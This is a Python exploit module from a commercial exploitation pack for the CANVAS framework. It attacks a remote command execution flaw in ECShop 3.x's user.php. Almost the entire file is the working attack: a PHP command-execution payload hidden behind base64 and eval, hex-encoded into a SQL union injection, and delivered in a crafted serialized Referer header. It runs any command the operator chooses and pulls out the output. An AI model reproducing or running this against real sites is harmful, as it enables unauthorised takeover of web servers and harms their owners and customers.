#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2019
#

import sys
import time
import os
import random
import base64
import io
import zipfile
import re

from urllib import urlopen
from sgmllib import SGMLParser

sys.path.append(".")
sys.path.append("../../")

import canvasengine
import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import tcpexploit


# GUI info
NAME = "ECShop 3.x Remote Command Execution Vulnerability"

DESCRIPTION = "Remote command execution vulnerability in ECShop user.php"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "ECShop"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Versions Affected"] = ""
DOCUMENTATION["Date public"] = "2018.09.10"
DOCUMENTATION["References"] = "https://www.codemonster.cn/2018/09/10/2018-ecshop-rce-analyse/"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "Unknown" 
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

VERSION = '1.0'

GTK2_DIALOG = 'dialog.glade2'

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["All"] ]

NOTES="""
"""

CHANGELOG="""
"""


class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.host = ""    
    self.cmd = "id"        
    self.basepath = "/"    
    self.protocol = "http"
    self.port = 80
    self.sslport = 443
    self.https = 0
    self.name = NAME
    return

	
  def exec_cmd(self):                   
    if self.https == 0:
        self.protocol = "http"
    else:
        self.protocol = "https"
        self.port = self.sslport
    
    ua = spkproxy.UserAgent("", exploit=self)
 
    # Payload  
    page = '$cmd = $_GET["a"];$descriptorspec = array(0=>array("pipe", "r"),1=>array("pipe","w"));$process = proc_open($cmd, $descriptorspec, $pipes, ".");echo "_XXXX_".stream_get_contents($pipes[1])."_XXXX_";fclose($pipes[1]);'
    shell= "eval/**/(base64_decode('%s'))"%base64.b64encode(page)
    data = '{$asd\'];%s;//}'%shell
    h = '0x'
    for d in data:        
        h += '%02x'%ord(d)
    payload = '*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,%s,10-- -'%(h)
    referer = '45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:%d:"%s";s:2:"id";s:9:"\' union/*";}45ea207d7a2b68c49582d2d22adf953a'%(len(payload), payload)    

    # Exec        
    url = '/user.php?act=login&a=%s'%self.cmd        
    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")   
    ua.addHeader("Referer", referer)                    
    buff = ua.GET(mainurl)
    if '_XXXX_' in buff:
        self.log('[D2] Output:\n%s'%(buff.split('_XXXX_')[1].split("_XXXX_")[0]))
    else:
        self.log('[D2] Tag not found')
        return 0
                		
    return 1

  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port", self.port))
    self.sslport = int(self.argsDict.get("sslport", self.sslport))
    self.https = int(self.argsDict.get("https", self.https))
    self.basepath = self.argsDict.get("basepath", self.basepath)     
    self.cmd = self.argsDict.get("cmd", self.cmd)

  def run(self):
    self.getargs()
    self.setInfo("%s attacking %s"%(NAME,self.host))
 
    ret = self.exec_cmd()
    
    self.setInfo("%s attacking %s - done"%(NAME, self.host))
    
    return ret

  def usage(self):
    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME, VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
